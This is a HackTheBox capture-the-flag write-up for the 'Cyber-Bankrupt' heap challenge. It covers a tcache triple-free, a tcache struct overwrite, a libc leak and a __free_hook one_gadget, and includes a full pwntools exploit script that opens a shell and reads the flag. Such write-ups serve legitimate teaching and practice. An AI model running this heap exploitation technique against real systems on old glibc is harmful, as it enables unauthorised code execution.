---
title: "Cyber-Bankrupt"
ctf: "HackTheBox"
date: 2026-06-17
category: pwn
difficulty: medium
flag_format: "HTB{...}"
---

# Cyber-Bankrupt

## Summary

Single-slot heap manager with 14-ops limit and glibc 2.27. Triple-free to leak heap address → overwrite tcache struct → create fake chunk → unsorted bin libc leak → poison __free_hook → one_gadget.

## Solution

### Key constraints
- Single pointer slot `acc[0]`; each transfer/free/view = 1 op (14 max)
- glibc 2.27: tcache has no double-free check, counts are `char[]`, no safe-linking
- Binary renders view output with ANSI codes + Unicode box-drawing, but `puts()` outputs raw data first; use `recvline()` to get raw leak bytes

### Phase 1: Heap leak via triple-free

Alloc chunk A (0x1F1 → tcache idx 30, chunk size 0x200). Free 3×: `counts[30]=3, entries[30]=A, A->next=A`. View reads A's first 8 bytes = A's own address → heap leak. Tcache struct address: `TCD = A - 0x660`.

### Phase 2: Tcache struct overwrite

Two allocs consume 2 of 3 tcache entries; third alloc returns TCD. Write fake tcache struct with `entries[7]=TCD+0x120` (fake 0x90-size chunk), `counts[7]=8` (skip tcache on free → unsorted bin), `entries[8]=TCD` (back pointer for Phase 4), and guard chunks at TCD+0x1A8/TCD+0x1C8.

### Phase 3: Libc leak

Alloc from idx 7 → returns TCD+0x120 (fake chunk). Free → unsorted bin (counts[7]=7 == threshold → bypass tcache). View reads fd pointer → `libc_base = leak - 0x3ebca0`.

### Phase 4: one_gadget

Alloc from idx 8 → returns TCD. Write `entries[0]=__free_hook, counts[0]=1`. Alloc from idx 0 → returns __free_hook. Write one_gadget `0x4f322` (constraint: `[rsp+0x40] == NULL`). Free → triggers one_gadget → shell.

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.binary = ELF('./challenge/cyber_bankrupt')
libc = ELF('./challenge/glibc/libc.so.6')
context.log_level = 'info'

LOCAL = len(sys.argv) < 2 or sys.argv[1] in ('127.0.0.1', 'localhost')
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
BINDIR = './challenge'
AMOUNT = 0x1F1
TIMEOUT = 15

def start():
    if LOCAL:
        return process(['./glibc/ld-linux-x86-64.so.2', '--library-path', './glibc/', './cyber_bankrupt'], cwd=BINDIR)
    return remote('127.0.0.1', PORT)

def menu(p, i): p.sendlineafter(b'> ', str(i).encode(), timeout=TIMEOUT)
def transfer(p, a, d):
    menu(p,1); p.sendlineafter(b'ID:',b'0',timeout=TIMEOUT)
    p.sendlineafter(b'transfer:',str(a).encode(),timeout=TIMEOUT)
    p.sendafter(b'receiver:',d,timeout=TIMEOUT); p.recvuntil(b'succeed!',timeout=TIMEOUT)
def clear(p):
    menu(p,2); p.sendlineafter(b'ID:',b'0',timeout=TIMEOUT); p.recvuntil(b'out!',timeout=TIMEOUT)
def view(p):
    menu(p,3); p.sendlineafter(b'ID:',b'0',timeout=TIMEOUT); return p.recvline(timeout=TIMEOUT).rstrip(b'\n')

def exploit():
    p = start()
    p.recvuntil(b'pin:',timeout=TIMEOUT); p.sendline(b'6969')

    transfer(p, AMOUNT, b'\x00'); clear(p); clear(p); clear(p)
    A = u64(view(p)[:6].ljust(8,b'\x00')); TCD = A - 0x660
    log.info(f"A={hex(A)} TCD={hex(TCD)}")

    transfer(p, AMOUNT, p64(TCD))
    transfer(p, AMOUNT, b'\x00'*(AMOUNT-1))
    pay = bytearray(AMOUNT-1)
    pay[7] = 8; pay[8] = 1
    pay[0x78:0x80] = p64(TCD+0x120); pay[0x80:0x88] = p64(TCD)
    pay[0x118:0x120] = p64(0x91); pay[0x1A8:0x1B0] = p64(0x21); pay[0x1C8:0x1D0] = p64(0x21)
    transfer(p, AMOUNT, bytes(pay))

    transfer(p, 0x80, b'\x00'); clear(p)
    libc.address = u64(view(p)[:6].ljust(8,b'\x00')) - 0x3ebca0
    log.info(f"libc={hex(libc.address)}")

    p12 = bytearray(0x90); p12[0] = 1
    p12[0x40:0x48] = p64(libc.sym['__free_hook'])
    p12[0x80:0x88] = p64(TCD)
    transfer(p, 0x90, bytes(p12[:0x8F]))
    transfer(p, 0x18, p64(libc.address + 0x4f322))
    clear(p)

    sleep(0.5); p.sendline(b'id')
    log.success(f"Shell: {p.recvline(timeout=5)}")
    p.sendline(b'cat /flag* 2>/dev/null; ls -la')
    log.success(p.recvrepeat(timeout=3))
    p.interactive()

exploit()
```

## Flag

```
HTB{b4nk5_5t1ll_u53_0ld_l1br4r135}
```

## Key Lessons

1. **Heap layout varies between local and remote**: The remote binary had NO stdout buffer allocation before our first `malloc()`, placing the tcache struct data at `heap_base+0x10` instead of `heap_base+0x20`. This changed the offset from A to TCD from `0x660` to `0x250`.

2. **Auto-detect heap layout**: Leak A's address, check `A & 0xFFF` to determine which layout the remote has:
   - `0x680` → local (stdout buffer present) → offset `0x660`
   - `0x260` → remote (no stdout buffer) → offset `0x250`

3. **Brute-force TCD candidate range**: Valid heap addresses (within the mapped tcache struct region) don't crash on alloc3; addresses before heap_base segfault. Tested offsets 0x240-0x270 to find the valid range (0x240, 0x250, 0x260 work; 0x270 crashes). Then ran full exploit with each to find the correct one (only 0x250 gives correct libc leak).
